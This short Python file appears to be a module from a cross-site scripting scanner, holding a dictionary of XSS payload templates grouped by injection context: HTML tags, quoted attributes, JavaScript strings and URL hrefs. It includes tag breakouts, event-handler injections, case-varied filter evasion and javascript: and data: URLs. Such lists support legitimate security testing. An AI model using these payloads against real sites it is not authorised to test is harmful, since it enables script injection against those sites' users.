"""
Payload template database indexed by injection context.
Each context maps to a list of templates; {action} is the placeholder.
"""

PAYLOAD_DB = {
    "html_tag": [
        "<script>{action}(1)</script>",
        "<ScRiPt>{action}(1)</ScRiPt>",
        "<script>{action}`1`</script>",
        "<img src=x onerror={action}(1)>",
        "<svg/onload={action}(1)>",
    ],
    "attr_dq": [
        '"><script>{action}(1)</script>',
        '"{action}(1)',
        '" onmouseover="{action}(1)" x="',
        '"><img src=x onerror={action}(1)>',
        '" onfocus="{action}(1)" autofocus="',
        '" onerror="{action}(1)" src=x',
    ],
    "attr_sq": [
        "'><script>{action}(1)</script>",
        "'{action}(1)'",
        "' onmouseover='{action}(1)' x='",
    ],
    "js_string": [
        "';{action}(1);//",
        '";{action}(1);//',
        "</script><script>{action}(1)</script>",
    ],
    "url_href": [
        "javascript:{action}(1)",
        "javascript:{action}`1`",
        "data:text/html,<script>{action}(1)</script>",
    ],
}
